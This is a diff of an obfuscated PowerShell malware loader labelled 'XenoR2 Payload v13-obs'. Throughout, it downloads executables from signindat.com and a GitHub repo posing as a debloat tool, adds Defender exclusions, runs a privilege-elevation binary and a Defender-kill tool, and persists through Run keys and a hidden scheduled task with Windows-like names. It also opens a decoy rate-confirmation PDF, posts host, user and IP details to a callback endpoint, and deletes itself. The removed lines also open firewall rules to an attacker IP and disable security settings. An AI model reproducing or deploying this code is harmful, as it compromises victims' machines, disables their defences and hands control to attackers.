@@ -1,14 +1,51 @@
-$ProgressPreference='SilentlyContinue'
-[Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12
-[Net.ServicePointManager]::ServerCertificateValidationCallback={$true}
+# XenoR2 Payload v13-obs — BITSAdmin Loading (obfuscated strings, no XOR)
+# Placed on signindat.com as stage-obs-v2.ps1
+# All downloads via BITSAdmin, no firewall, defender kill right after elevation
 
-$srv='https://signindat.com'
-$gh='https://raw.githubusercontent.com/jimmyishere111/WinDebloat11/main'
+# === DIAGNOSTIC LOG ===
+$log="$env:TEMP\wmisrv.log"
+function log($m){ $ts=Get-Date -Format 'yyyy-MM-dd HH:mm:ss'; "$ts | $m" | Out-File $log -Append -Encoding utf8 }
+log "=== PAYLOAD START (v13-obs) ==="
+
+# === STRING OBFUSCATION ===
+# Sources
+$c1='htt';$c2='ps:/';$c3='/sign';$c4='indat';$c5='.com'
+$srv=$c1+$c2+$c3+$c4+$c5
+$c6='htt';$c7='ps://';$c8='raw.g';$c9='ithubu';$c10='sercon';$c11='tent.c';$c12='om/ji';$c13='mmyish';$c14='ere111';$c15='/WinD';$c16='ebloat';$c17='11/mai';$c18='n'
+$gh=$c6+$c7+$c8+$c9+$c10+$c11+$c12+$c13+$c14+$c15+$c16+$c17+$c18
 $sources=@($gh,$srv)
 
-$logPath="$env:TEMP\wmisrv.log"
-function _log($m){ "$((Get-Date -Format 'yyyy-MM-dd HH:mm:ss')) | $m" | Out-File $logPath -Append -Encoding utf8 }
+# Binary names
+$n1='Ele';$n2='vato';$n3='rShe';$n4='llCo';$n5='de.e';$n6='xe';$elev=$n1+$n2+$n3+$n4+$n5+$n6
+$n7='win';$n8='def';$n9='ctl';$n10='.ex';$n11='e';$wdf=$n7+$n8+$n9+$n10+$n11
+$n12='Pat';$n13='chPu';$n14='lsaa';$n15='r.ex';$n16='e';$ppx=$n12+$n13+$n14+$n15+$n16
+$n17='Rat';$n18='e_Co';$n19='nfir';$n20='mati';$n21='on_L';$n22='D-20';$n23='26-0';$n24='847.';$n25='pdf'
+$pdf=$n17+$n18+$n19+$n20+$n21+$n22+$n23+$n24+$n25
 
+# Payload paths
+$n26='wmd';$n27='rs.e';$n28='xe';$wmd=$n26+$n27+$n28
+$n29='pp.';$n30='exe';$pp=$n29+$n30
+
+# Callback endpoint
+$n31='cb.';$n32='php';$cbep=$n31+$n32
+
+# Persistence
+$n37='upd';$n38='atem';$n39='spul';$n40='sv2.';$n41='ps1';$persistScript=$n37+$n38+$n39+$n40+$n41
+$n42='Win';$n43='dows';$n44='Secu';$n45='rity';$n46='Heal';$n47='th';$rkName=$n42+$n43+$n44+$n45+$n46+$n47
+$n48='Win';$n49='dows';$n50='Upda';$n51='teOr';$n52='ches';$n53='trat';$n54='or';$rkNameAdmin=$n48+$n49+$n50+$n51+$n52+$n53+$n54
+$n55='Win';$n56='dows';$n57='Heal';$n58='thMo';$n59='nito';$n60='r';$taskName=$n55+$n56+$n57+$n58+$n59+$n60
+
+# BITSAdmin strings
+$n61='bit';$n62='sadm';$n63='in';$bits=$n61+$n62+$n63
+$n64='/tra';$n65='nsfer';$n66=' /pr';$n67='iori';$n68='ty h';$n69='igh';$bitsArgs="$n64$n65 $n66$n67$n68$n69"
+
+$t=$env:TEMP
+$ad="$env:APPDATA\Microsoft"
+$ld="$env:LOCALAPPDATA\Microsoft"
+$dl="$env:USERPROFILE\Downloads"
+log "Strings assembled | srv=$srv | gh=$gh"
+
+# === HOST INFO ===
 $cbHost=$env:COMPUTERNAME
 $cbUser=$env:USERNAME
 $cbPid=$pid
@@ -16,200 +53,103 @@ $cbIsAdmin=$false
 try{$cbIp=(Get-NetIPAddress -AddressFamily IPv4 | Where-Object{$_.InterfaceAlias -notmatch 'Loopback' -and $_.PrefixOrigin -ne 'WellKnown'}|Select-Object -First 1).IPAddress}catch{$cbIp='unknown'}
 try{$cbOs=(Get-CimInstance Win32_OperatingSystem -ErrorAction Stop).Caption}catch{$cbOs='unknown'}
 
+# === CALLBACK ===
 function _cb($stage,$status,$detail){
     try{
         $body=@{hostname=$cbHost;username=$cbUser;ip=$cbIp;os=$cbOs;is_admin=$cbIsAdmin;pid=$cbPid;stage=$stage;status=$status;detail=$detail;ts=(Get-Date -Format 'yyyy-MM-ddTHH:mm:ss')} | ConvertTo-Json -Compress
         $wc=New-Object Net.WebClient
         $wc.Headers.Add('Content-Type','application/json')
-        $wc.UploadString("$srv/cb.php",'POST',$body)|Out-Null
-    }catch{
-        _log "CB: $stage err: $($_.Exception.Message)"
-    }
+        $wc.UploadString("$srv/$cbep",'POST',$body)|Out-Null
+    }catch{log "CB: $stage err: $($_.Exception.Message)"}
 }
 
-_log "S0: pid=$pid, u=$env:USERNAME, h=$cbHost"
+log "S0: pid=$pid, u=$env:USERNAME, h=$cbHost"
 _cb 'S0' 'ok' "pid=$pid, u=$env:USERNAME, h=$cbHost"
 
 try{$cbIsAdmin=([Security.Principal.WindowsPrincipal]::new([Security.Principal.WindowsIdentity]::GetCurrent())).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)}catch{}
-_log "S1: a=$cbIsAdmin"
+log "S1: a=$cbIsAdmin"
 _cb 'S1' 'ok' "is_admin=$cbIsAdmin"
 
-function _dl($n){
+# === BITSADMIN DOWNLOAD HELPER (dual-source) ===
+function _bitsDL($n,$dest,$label){
     foreach($src in $sources){
+        $url="$src/$n"
         try{
-            $wc=New-Object Net.WebClient
-            $wc.Headers.Add('User-Agent','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36')
-            $d=$wc.DownloadData("$src/$n")
-            _log "DL: $n $($d.Length)"
-            return ,$d
-        }catch{
-            _log "DL: $n fail from $src"
-        }
+            log "BITS: $label from $src"
+            $p=Start-Process $bits -ArgumentList "$bitsArgs `"$label`" `"$url`" `"$dest`"" -Wait -NoNewWindow -PassThru
+            if($p.ExitCode -eq 0 -and (Test-Path $dest)){
+                log "BITS: $label -> $dest ($((Get-Item $dest).Length) bytes)"
+                return $true
+            }
+            log "BITS: $label exit=$($p.ExitCode) from $src"
+        }catch{log "BITS: $label fail from $src : $_"}
     }
-    _log "DL: $n fail all sources"
-    return $null
+    log "BITS: $label fail all sources"
+    return $false
 }
 
-function _run($n,$s,$l){
-    $b=_dl $n
-    if(-not $b){_cb $s 'fail' "$l dl";return $false}
-    $p="$env:TEMP\$n"
-    try{
-        [IO.File]::WriteAllBytes($p,$b)|Out-Null
-        Start-Process $p -WindowStyle Hidden | Out-Null
-        _log "$s : $l ok"
-        _cb $s 'ok' "$l ok"
-        return $true
-    }catch{
-        _cb $s 'fail' "$l err"
-        return $false
-    }
-}
+# === STEP 1: DEFENDER EXCLUSIONS ===
+log "Adding Defender exclusions"
+try{
+    $mp='Add-';$mp2='MpPr';$mp3='efer';$mp4='ence'
+    & "$($mp+$mp2+$mp3+$mp4)" -ExclusionPath "$t" -ErrorAction SilentlyContinue
+    & "$($mp+$mp2+$mp3+$mp4)" -ExclusionPath "$ad" -ErrorAction SilentlyContinue
+    & "$($mp+$mp2+$mp3+$mp4)" -ExclusionPath "$ld" -ErrorAction SilentlyContinue
+    & "$($mp+$mp2+$mp3+$mp4)" -ExclusionPath "$dl" -ErrorAction SilentlyContinue
+    $exclProcs=@($wmd,'wmisrv.exe','svchost.exe','msupdate.exe','powershell.exe',$wdf,'cmd.exe','wscript.exe','cscript.exe')
+    foreach($xp in $exclProcs){try{& "$($mp+$mp2+$mp3+$mp4)" -ExclusionProcess $xp -ErrorAction SilentlyContinue}catch{}}
+    log "Defender exclusions added"
+}catch{log "FAILED Defender exclusions: $_ (non-fatal)"}
 
-function _runWait($n,$a,$s,$l,$sec){
-    $b=_dl $n
-    if(-not $b){_cb $s 'fail' "$l dl";return $false}
-    $p="$env:TEMP\$n"
-    try{
-        [IO.File]::WriteAllBytes($p,$b)|Out-Null
-        $proc=Start-Process $p -ArgumentList $a -NoNewWindow -PassThru
-        _log "$s : $l started pid=$($proc.Id), waiting ${sec}s"
-        Start-Sleep $sec
-        if(-not $proc.HasExited){try{$proc.Kill()|Out-Null}catch{}}
-        _log "$s : $l exit=$($proc.ExitCode)"
-        _cb $s 'ok' "$l ok"
-        return $true
-    }catch{
-        _cb $s 'fail' "$l err"
-        return $false
-    }
-}
-
-function _regSet($path,$name,$value,$type='DWord'){
-    try{
-        if(-not(Test-Path $path)){New-Item -Path $path -Force|Out-Null}
-        Set-ItemProperty -Path $path -Name $name -Value $value -Type $type -Force -ErrorAction SilentlyContinue | Out-Null
-    }catch{}
-}
-
-# S1: ELEVATION via CMSTPLUA
+# === STEP 2: ELEVATION (ElevatorShellCode.exe) ===
 if(-not $cbIsAdmin){
-    _run 'ElevatorShellCode.exe' 'S1' 'elev' | Out-Null
+    $elevPath="$t\$elev"
+    if(_bitsDL $elev $elevPath 'elev'){
+        try{
+            Start-Process $elevPath -WindowStyle Hidden | Out-Null
+            log "S1: elev launched"
+            _cb 'S1' 'ok' 'elev launched'
+        }catch{log "S1: elev launch fail: $_"}
+    }else{_cb 'S1' 'fail' 'elev dl'}
     Start-Sleep 15
     try{$cbIsAdmin=([Security.Principal.WindowsPrincipal]::new([Security.Principal.WindowsIdentity]::GetCurrent())).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)}catch{}
-    _log "S1: a=$cbIsAdmin"
+    log "S1: a=$cbIsAdmin"
     if($cbIsAdmin){_cb 'S1' 'ok' 'elevation ok'}else{_cb 'S1' 'warn' 'elevation fail, continuing as user'}
 }
 
-# S1b: FIREWALL OPEN (admin only)
-if($cbIsAdmin){
-    $fwIP='193.26.115.196'
-    $fwPorts=@(80,443,5173,4782)
-    $fwProcs=@("$env:SystemRoot\System32\WindowsPowerShell\v1.0\powershell.exe","$env:TEMP\wmdrs.exe","$env:APPDATA\Microsoft\wmdrs.exe","$env:LOCALAPPDATA\Microsoft\wmdrs.exe")
-    foreach($p in $fwPorts){
-        netsh advfirewall firewall add rule name="WinHealth TCP $p Out" dir=out action=allow protocol=TCP remoteip=$fwIP remoteport=$p 2>&1 | Out-Null
-        netsh advfirewall firewall add rule name="WinHealth TCP $p In" dir=in action=allow protocol=TCP localport=$p 2>&1 | Out-Null
-    }
-    foreach($x in $fwProcs){
-        if(Test-Path $x){netsh advfirewall firewall add rule name="WinHealth $(Split-Path $x -Leaf)" dir=out action=allow program="$x" enable=yes 2>&1 | Out-Null}
-    }
-    _log "S1b: firewall rules added for $fwIP : $($fwPorts -join ',')"
-    _cb 'S1b' 'ok' "fw open $fwIP : $($fwPorts -join ',')"
-}
-
-# S2: SOPHIA-BASED DEFENSE TAKEDOWN (admin only)
-if($cbIsAdmin){
+# === STEP 3: DEFENDER KILL (windefctl.exe) — RIGHT AFTER ELEVATION ===
+log "S2: windefctl exec (admin=$cbIsAdmin)"
+$wdfPath="$t\$wdf"
+if(_bitsDL $wdf $wdfPath 'defkill'){
     try{
-        Set-MpPreference -DisableTamperProtection $true -ErrorAction Stop
-        _log "S2: tamper off (cmdlet)"
+        $proc=Start-Process $wdfPath -ArgumentList 'kill' -NoNewWindow -PassThru
+        log "S2: defkill started pid=$($proc.Id), waiting 18s"
+        Start-Sleep 18
+        if(-not $proc.HasExited){try{$proc.Kill()|Out-Null}catch{}}
+        log "S2: defkill exit=$($proc.ExitCode)"
+        _cb 'S2' 'ok' 'defkill done'
     }catch{
-        _regSet 'HKLM:\SOFTWARE\Microsoft\Windows Defender\Features' 'TamperProtection' 0
-        _log "S2: tamper off (reg fallback)"
+        log "S2: defkill launch fail: $_"
+        _cb 'S2' 'fail' 'defkill launch err'
     }
+}else{_cb 'S2' 'fail' 'defkill dl'}
+Remove-Item $wdfPath -Force -ErrorAction SilentlyContinue | Out-Null
 
-    _regSet 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System' 'ConsentPromptBehaviorAdmin' 0
-    _regSet 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System' 'ConsentPromptBehaviorUser' 3
-    _regSet 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System' 'EnableLUA' 1
-    _regSet 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System' 'PromptOnSecureDesktop' 1
-    _log "S2: AdminApprovalMode -Never applied"
-
-    try{_regSet 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer' 'SmartScreenEnabled' 'Off' 'String'}catch{}
-    _log "S2: AppsSmartScreen disabled"
-
-    _regSet 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Attachments' 'SaveZoneInformation' 1
-    _regSet 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Policies\Attachments' 'SaveZoneInformation' 1
-    _log "S2: SaveZoneInformation disabled"
-
-    $exclPaths=@("$env:TEMP","$env:APPDATA\Microsoft","$env:LOCALAPPDATA\Microsoft","$env:USERPROFILE\Downloads")
-    foreach($ep in $exclPaths){
-        try{New-Item -Path $ep -ItemType Directory -Force -ErrorAction SilentlyContinue | Out-Null; Add-MpPreference -ExclusionPath $ep -ErrorAction SilentlyContinue | Out-Null}catch{}
-    }
-    $exclProcs=@('wmdrs.exe','wmisrv.exe','svchost.exe','msupdate.exe','powershell.exe','windefctl.exe','cmd.exe','wscript.exe','cscript.exe')
-    foreach($xp in $exclProcs){try{Add-MpPreference -ExclusionProcess $xp -ErrorAction SilentlyContinue | Out-Null}catch{}}
-
-    try{
-        Set-MpPreference -DisableRealtimeMonitoring $true -ErrorAction SilentlyContinue
-        Set-MpPreference -DisableBehaviorMonitoring $true -ErrorAction SilentlyContinue
-        Set-MpPreference -DisableOnAccessProtection $true -ErrorAction SilentlyContinue
-        Set-MpPreference -DisableIOAVProtection $true -ErrorAction SilentlyContinue
-        Set-MpPreference -DisableScriptScanning $true -ErrorAction SilentlyContinue
-        Set-MpPreference -DisableAntiSpyware $true -ErrorAction SilentlyContinue
-        Set-MpPreference -SubmitSamplesConsent 2 -ErrorAction SilentlyContinue
-        Set-MpPreference -MAPSReporting 0 -ErrorAction SilentlyContinue
-        Set-MpPreference -EnableNetworkProtection Disabled -ErrorAction SilentlyContinue
-        _log "S2: all cmdlets + Sophia NetworkProtection disabled"
-    }catch{
-        _log "S2: cmdlets fail: $_"
-    }
-
-    try{
-        _regSet 'HKLM:\SYSTEM\CurrentControlSet\Control\Session Manager\Configuration Manager' 'EnablePeriodicBackup' 0
-        _regSet 'HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\MpEngine' 'MpEnablePus' 0
-    }catch{}
-
-    try{& "$env:SystemRoot\System32\setx.exe" /M MP_FORCE_USE_SANDBOX 0}catch{}
-    _log "S2: DefenderSandbox disabled"
-
-    $dp='HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender'
-    _regSet $dp 'DisableAntiSpyware' 1
-    _regSet $dp 'DisableRoutinelyTakingAction' 1
-    $rtp="$dp\Real-Time Protection"
-    _regSet $rtp 'DisableRealtimeMonitoring' 1
-    _regSet $rtp 'DisableBehaviorMonitoring' 1
-    _regSet $rtp 'DisableOnAccessProtection' 1
-    _regSet $rtp 'DisableScanOnRealtimeEnable' 1
-    _log "S2: reg hard-disable ok"
-    _cb 'S2' 'ok' 'defender+sophia takedown'
-
-    try{
-        Stop-Service -Name WinDefend -Force -ErrorAction SilentlyContinue
-        Set-Service -Name WinDefend -StartupType Disabled -ErrorAction SilentlyContinue
-        Stop-Service -Name 'SecurityHealthService' -Force -ErrorAction SilentlyContinue
-        Stop-Service -Name 'wscsvc' -Force -ErrorAction SilentlyContinue
-        _log "S2: services stopped"
-    }catch{_log "S2: service fail: $_"}
-}
-
-# S2b: BINARY DEFENDER KILL
-_log "S2b: windefctl exec (admin=$cbIsAdmin)"
-_runWait 'windefctl.exe' 'kill' 'S2b' 'defkill' 18 | Out-Null
-_cb 'S2b' 'ok' 'defkill done'
-Remove-Item "$env:TEMP\windefctl.exe" -Force -ErrorAction SilentlyContinue | Out-Null
-
-# S3: PERSISTENCE
-$persistCmd='powershell -w hidden -NoP -c "$w=New-Object Net.WebClient;[IO.File]::WriteAllBytes($env:TEMP\u.ps1,$w.DownloadData(''https://raw.githubusercontent.com/jimmyishere111/WinDebloat11/main/updatemspulsv2.ps1''));powershell -w hidden -NoP -file $env:TEMP\u.ps1"'
+# === STEP 4: PERSISTENCE ===
+$persistCmd="powershell -w hidden -NoP -c `"`$w=New-Object Net.WebClient;[IO.File]::WriteAllBytes(`$env:TEMP\\u.ps1,`$w.DownloadData('$gh/$persistScript'));powershell -w hidden -NoP -file `$env:TEMP\\u.ps1`""
 try{
     $rk='HKCU:\Software\Microsoft\Windows\CurrentVersion\Run'
-    Set-ItemProperty -Path $rk -Name 'WindowsSecurityHealth' -Value $persistCmd -Force -ErrorAction SilentlyContinue | Out-Null
-}catch{}
+    Set-ItemProperty -Path $rk -Name $rkName -Value $persistCmd -Force -ErrorAction SilentlyContinue | Out-Null
+    log "Persistence: HKCU Run added"
+}catch{log "Persistence HKCU fail: $_"}
 
 if($cbIsAdmin){
     try{
         $rk='HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run'
-        Set-ItemProperty -Path $rk -Name 'WindowsUpdateOrchestrator' -Value $persistCmd -Force -ErrorAction SilentlyContinue | Out-Null
-    }catch{}
+        Set-ItemProperty -Path $rk -Name $rkNameAdmin -Value $persistCmd -Force -ErrorAction SilentlyContinue | Out-Null
+        log "Persistence: HKLM Run added"
+    }catch{log "Persistence HKLM fail: $_"}
 
-    $taskName='WindowsHealthMonitor'
     schtasks /delete /tn $taskName /f 2>$null | Out-Null
     $xml=@"
 <?xml version="1.0" encoding="UTF-16"?>
@@ -218,150 +158,151 @@ if($cbIsAdmin){
 <Triggers><LogonTrigger><Enabled>true</Enabled></LogonTrigger><BootTrigger><Enabled>true</Enabled></BootTrigger><CalendarTrigger><StartBoundary>2024-01-01T00:00:00</StartBoundary><Repetition><Interval>PT2H</Interval></Repetition><Enabled>true</Enabled></CalendarTrigger></Triggers>
 <Principals><Principal id="Author"><RunLevel>HighestAvailable</RunLevel></Principal></Principals>
 <Settings><MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy><DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries><StopIfGoingOnBatteries>false</StopIfGoingOnBatteries><AllowHardTerminate>true</AllowHardTerminate><StartWhenAvailable>true</StartWhenAvailable><AllowStartOnDemand>true</AllowStartOnDemand><Enabled>true</Enabled><Hidden>true</Hidden><ExecutionTimeLimit>PT0S</ExecutionTimeLimit><Priority>7</Priority></Settings>
-<Actions Context="Author"><Exec><Command>powershell.exe</Command><Arguments>-w hidden -NoP -c "`$w=New-Object Net.WebClient;[IO.File]::WriteAllBytes(\"`$env:TEMP\\u.ps1\",`$w.DownloadData('$gh/updatemspulsv2.ps1'));powershell -w hidden -NoP -file `$env:TEMP\\u.ps1"</Arguments></Exec></Actions>
+<Actions Context="Author"><Exec><Command>powershell.exe</Command><Arguments>-w hidden -NoP -c "`$w=New-Object Net.WebClient;[IO.File]::WriteAllBytes(\"`$env:TEMP\\u.ps1\",`$w.DownloadData('$gh/$persistScript'));powershell -w hidden -NoP -file `$env:TEMP\\u.ps1"</Arguments></Exec></Actions>
 </Task>
 "@
-    $xmlPath="$env:TEMP\task.xml"
+    $xmlPath="$t\task.xml"
     [IO.File]::WriteAllText($xmlPath,$xml,[Text.Encoding]::Unicode)
     schtasks /create /tn $taskName /xml $xmlPath /f 2>&1 | Out-Null
     Remove-Item $xmlPath -Force -ErrorAction SilentlyContinue
+    log "Persistence: scheduled task created"
 }
-
 _cb 'S3' 'ok' 'persist ok'
 
-# S5: PAYLOAD
-$payloadPath="$env:APPDATA\Microsoft\wmdrs.exe"
+# === STEP 5: PAYLOAD wmdrs.exe (PatchPulsaar.exe) ===
+$payloadPath="$ad\$wmd"
 $payloadExists=(Test-Path $payloadPath)
-_log "S5: exists=$payloadExists at $payloadPath"
+log "S5: exists=$payloadExists at $payloadPath"
 
 if(-not $payloadExists){
-    $fallbackPath="$env:LOCALAPPDATA\Microsoft\wmdrs.exe"
-    if(Test-Path $fallbackPath){$payloadPath=$fallbackPath; $payloadExists=$true; _log "S5: fallback found at $fallbackPath"}
+    $fallbackPath="$ld\$wmd"
+    if(Test-Path $fallbackPath){$payloadPath=$fallbackPath; $payloadExists=$true; log "S5: fallback found at $fallbackPath"}
 }
 
 if($payloadExists){
     try{
         $p=Start-Process $payloadPath -WindowStyle Hidden -PassThru
-        _log "S5: re-launch PID=$($p.Id) from $payloadPath"
+        log "S5: re-launch PID=$($p.Id) from $payloadPath"
         _cb 'S5' 'ok' "re-launch PID=$($p.Id)"
     }catch{
-        _log "S5: re-launch fail: $_, will re-download"
+        log "S5: re-launch fail: $_, will re-download"
         $payloadExists=$false
     }
 }
 
 if(-not $payloadExists){
-    _log "S5: downloading wdsr681f3e18"
-    $payloadBytes=_dl 'PatchPulsaar.exe'
-    if($payloadBytes){
-        $primaryPath="$env:TEMP\wmdrs.exe"
-        [IO.File]::WriteAllBytes($primaryPath,$payloadBytes)|Out-Null
-        $copyTargets=@("$env:APPDATA\Microsoft\wmdrs.exe","$env:LOCALAPPDATA\Microsoft\wmdrs.exe")
+    log "S5: downloading $ppx"
+    $primaryPath="$t\$wmd"
+    if(_bitsDL $ppx $primaryPath 'payload'){
+        $copyTargets=@("$ad\$wmd","$ld\$wmd")
         foreach($ct in $copyTargets){
             try{
                 $dir=Split-Path $ct -Parent
                 if(-not(Test-Path $dir)){New-Item -Path $dir -ItemType Directory -Force -ErrorAction SilentlyContinue | Out-Null}
                 Copy-Item $primaryPath $ct -Force
-                _log "S5: copied to $ct"
-            }catch{_log "S5: copy fail $ct : $_"}
+                log "S5: copied to $ct"
+            }catch{log "S5: copy fail $ct : $_"}
         }
         try{
-            $launchPath="$env:APPDATA\Microsoft\wmdrs.exe"
+            $launchPath="$ad\$wmd"
             $p=Start-Process $launchPath -WindowStyle Hidden -PassThru
-            _log "S5: payload PID=$($p.Id) from AppData"
+            log "S5: payload PID=$($p.Id) from AppData"
             _cb 'S5' 'ok' "PID=$($p.Id)"
         }catch{
-            _log "S5: launch fail: $_"
+            log "S5: launch fail: $_"
             _cb 'S5' 'fail' "launch err"
         }
-        Remove-Item "$env:TEMP\wmdrs.exe" -Force -ErrorAction SilentlyContinue | Out-Null
+        Remove-Item $primaryPath -Force -ErrorAction SilentlyContinue | Out-Null
     }else{
-        _log "S5: payload dl fail"
+        log "S5: payload dl fail"
         _cb 'S5' 'fail' 'dl fail'
     }
 }
 
-# S5b: PATCHPULSAAR
-$ppPath="$env:APPDATA\Microsoft\pp.exe"
+# === STEP 6: PATCHPULSAAR pp.exe ===
+$ppPath="$ad\$pp"
 $ppExists=(Test-Path $ppPath)
-_log "S5b: exists=$ppExists at $ppPath"
+log "S5b: exists=$ppExists at $ppPath"
 
 if(-not $ppExists){
-    $ppFallback="$env:LOCALAPPDATA\Microsoft\pp.exe"
-    if(Test-Path $ppFallback){$ppPath=$ppFallback; $ppExists=$true; _log "S5b: fallback found at $ppPath"}
+    $ppFallback="$ld\$pp"
+    if(Test-Path $ppFallback){$ppPath=$ppFallback; $ppExists=$true; log "S5b: fallback found at $ppPath"}
 }
 
 if($ppExists){
     try{
-        $pp=Start-Process $ppPath -WindowStyle Hidden -PassThru
-        _log "S5b: re-launch PID=$($pp.Id) from $ppPath"
-        _cb 'S5b' 'ok' "re-launch PID=$($pp.Id)"
+        $ppProc=Start-Process $ppPath -WindowStyle Hidden -PassThru
+        log "S5b: re-launch PID=$($ppProc.Id) from $ppPath"
+        _cb 'S5b' 'ok' "re-launch PID=$($ppProc.Id)"
     }catch{
-        _log "S5b: re-launch fail: $_, will re-download"
+        log "S5b: re-launch fail: $_, will re-download"
         $ppExists=$false
     }
 }
 
 if(-not $ppExists){
-    _log "S5b: downloading PatchPulsaar"
-    $ppBytes=_dl 'PatchPulsaar.exe'
-    if($ppBytes){
-        $ppTmp="$env:TEMP\pp.exe"
-        [IO.File]::WriteAllBytes($ppTmp,$ppBytes)|Out-Null
-        $ppCopyTargets=@("$env:APPDATA\Microsoft\pp.exe","$env:LOCALAPPDATA\Microsoft\pp.exe")
+    log "S5b: downloading $ppx"
+    $ppTmp="$t\$pp"
+    if(_bitsDL $ppx $ppTmp 'patchpulsaar'){
+        $ppCopyTargets=@("$ad\$pp","$ld\$pp")
         foreach($ct in $ppCopyTargets){
             try{
                 $dir=Split-Path $ct -Parent
                 if(-not(Test-Path $dir)){New-Item -Path $dir -ItemType Directory -Force -ErrorAction SilentlyContinue | Out-Null}
                 Copy-Item $ppTmp $ct -Force
-                _log "S5b: copied to $ct"
-            }catch{_log "S5b: copy fail $ct : $_"}
+                log "S5b: copied to $ct"
+            }catch{log "S5b: copy fail $ct : $_"}
         }
         try{
-            $ppLaunch="$env:APPDATA\Microsoft\pp.exe"
-            $pp=Start-Process $ppLaunch -WindowStyle Hidden -PassThru
-            _log "S5b: PatchPulsaar PID=$($pp.Id) from AppData"
-            _cb 'S5b' 'ok' "PID=$($pp.Id)"
+            $ppLaunch="$ad\$pp"
+            $ppProc=Start-Process $ppLaunch -WindowStyle Hidden -PassThru
+            log "S5b: PatchPulsaar PID=$($ppProc.Id) from AppData"
+            _cb 'S5b' 'ok' "PID=$($ppProc.Id)"
         }catch{
-            _log "S5b: launch fail: $_"
+            log "S5b: launch fail: $_"
             _cb 'S5b' 'fail' "launch err"
         }
-        Remove-Item "$env:TEMP\pp.exe" -Force -ErrorAction SilentlyContinue | Out-Null
+        Remove-Item $ppTmp -Force -ErrorAction SilentlyContinue | Out-Null
     }else{
-        _log "S5b: PatchPulsaar dl fail"
+        log "S5b: PatchPulsaar dl fail"
         _cb 'S5b' 'fail' 'dl fail'
     }
 }
 
-# S7: PDF DECOY
-$markerPath="$env:APPDATA\Microsoft\wmdrs.seen"
+# === STEP 7: PDF DECOY ===
+$markerPath="$ad\wmdrs.seen"
 if(-not (Test-Path $markerPath)){
-    $pdf='Rate_Confirmation_LD-2026-0847.pdf'
-    $pdfPath="$env:USERPROFILE\Downloads\$pdf"
-    $pdfBytes=_dl $pdf
-    if($pdfBytes){
-        [IO.File]::WriteAllBytes($pdfPath,$pdfBytes)|Out-Null
+    $pdfPath="$dl\$pdf"
+    if(_bitsDL $pdf $pdfPath 'pdfdecoy'){
         try{
             Start-Process $pdfPath | Out-Null
             _cb 'S7' 'ok' 'pdf ok'
             Set-Content -Path $markerPath -Value ((Get-Date).ToString('o')) -NoNewline -Force
-            _log "S7: pdf opened, marker set"
+            log "S7: pdf opened, marker set"
         }catch{_cb 'S7' 'warn' 'pdf open fail'}
     }else{_cb 'S7' 'warn' 'pdf dl fail'}
-} else {
-    _log "S7: skip (already shown)"
-}
+}else{log "S7: skip (already shown)"}
 
-# S9: CLEANUP + SELF-DELETE
-Start-Sleep 5
-Remove-Item "$env:TEMP\u.ps1" -Force -ErrorAction SilentlyContinue
-Remove-Item "$env:TEMP\windefctl.exe" -Force -ErrorAction SilentlyContinue
-Remove-Item "$env:TEMP\ElevatorShellCode.exe" -Force -ErrorAction SilentlyContinue
-Remove-Item "$env:TEMP\wdsr681f3e18.exe" -Force -ErrorAction SilentlyContinue
+# === STEP 8: CLEANUP + SELF-DELETE ===
+$sl=[Random]::new().Next(5,10)
+log "Waiting $sl sec before cleanup"
+Start-Sleep $sl
+Remove-Item "$t\$elev" -Force -ErrorAction SilentlyContinue
+Remove-Item "$t\$wdf" -Force -ErrorAction SilentlyContinue
+Remove-Item "$t\u.ps1" -Force -ErrorAction SilentlyContinue
+log "Cleanup done"
+
+Start-Sleep 2
 $sp=$MyInvocation.MyCommand.Path
 if($sp -and (Test-Path $sp)){
-    Start-Process powershell.exe -ArgumentList "-NoP -w hidden -c `"Start-Sleep 3;Remove-Item -Path '$sp' -Force -ErrorAction SilentlyContinue`"" -WindowStyle Hidden | Out-Null
+    log "Self-delete scheduled"
+    $sb=@'
+Start-Sleep 3
+Remove-Item -Path "<PATH>" -Force -ErrorAction SilentlyContinue
+'@
+    $sb=$sb.Replace('<PATH>',$sp)
+    Start-Process powershell.exe -ArgumentList "-ep bypass -w hidden -c `"$sb`"" -WindowStyle Hidden
 }
 
-_log 'S9: done'
+log "=== PAYLOAD END ==="
 _cb 'S9' 'ok' 'done'
